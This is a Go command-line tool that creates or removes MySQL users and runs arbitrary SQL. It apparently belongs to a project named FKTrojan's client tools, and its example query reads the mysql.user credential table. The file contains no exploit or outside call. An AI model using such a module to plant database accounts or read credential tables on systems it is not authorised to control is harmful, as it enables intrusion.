package main

import (
	. "FKTrojan/client_tools/common"
	"encoding/json"
	"fmt"
	"os"

	"flag"
)

func RunCmd(c Cmd) error {

	err := c.Before()
	if err != nil {
		return err
	}
	// if Execute err After is still need to run
	defer c.After()
	ret, err := c.Execute()
	if err != nil {
		return err
	}
	jsonResult, _ := json.MarshalIndent(ret, "  ", "  ")
	fmt.Println(string(jsonResult))

	return nil
}
func JsonPrintHelp() {

	app := AppUsage{
		Name:    ExeBaseName(),
		Version: "1.0.0",
		Desc:    "this is for add/del mysql user and execute mysql command",
		Parameters: []Parameter{
			{
				LongFmt:  "-c",
				ShortFmt: "-c",
				Example:  "add",
				Desc:     "add/del : add/del user; sql: execute sql",
				Required: true,
				Type:     "string",
			},
			{
				LongFmt:  "-u",
				ShortFmt: "-u",
				Example:  "newmysqluser",
				Desc:     "username",
				Required: true,
				Type:     "string",
			}, {
				LongFmt:  "-p",
				ShortFmt: "-p",
				Example:  "password",
				Desc:     "password for user",
				Required: true,
				Type:     "string",
			},
			{
				LongFmt:  "-s",
				ShortFmt: "-s",
				Example:  "sql sentence supported by mysql",
				Desc:     "select * from mysql.user",
				Required: false,
				Type:     "string",
			},
		},
	}
	var b []byte
	if len(os.Args) >= 2 && os.Args[1] == "--HELP" {
		b, _ = json.Marshal(app)
	} else {
		b, _ = json.MarshalIndent(app, " ", " ")
	}
	fmt.Println(string(b))
}
func main() {
	if len(os.Args) > 1 {
		if os.Args[1] == "--help" || os.Args[1] == "-h" {
			JsonPrintHelp()
			os.Exit(0)
		}
	}

	cmd := flag.String("c", "", "")
	user := flag.String("u", "", "")
	pass := flag.String("p", "", "")
	sql := flag.String("s", "", "")
	flag.Parse()
	if *cmd == "" {
		fmt.Println("-c is not set")
		return
	}
	if *user == "" {
		fmt.Println("-u is not set")
		return
	}
	if *pass == "" {
		fmt.Println("-p is not set")
		return
	}
	if *cmd == "sql" && *sql == "" {
		fmt.Println("-s should not be empty while -c is sql")
		return
	}
	var c Cmd
	switch *cmd {
	case "add":
		c = NewCmdCreateUser(*user, *pass)
		break
	case "del":
		c = NewCmdRemoveUser(*user, *pass, *user)
		break
	case "sql":
		c = NewCmdRunSql(*user, *pass, *sql)
		break
	default:
		fmt.Printf("cmd %s is not supported\n", *cmd)
		return
	}
	fmt.Println(c.String())
	RunCmd(c)

}
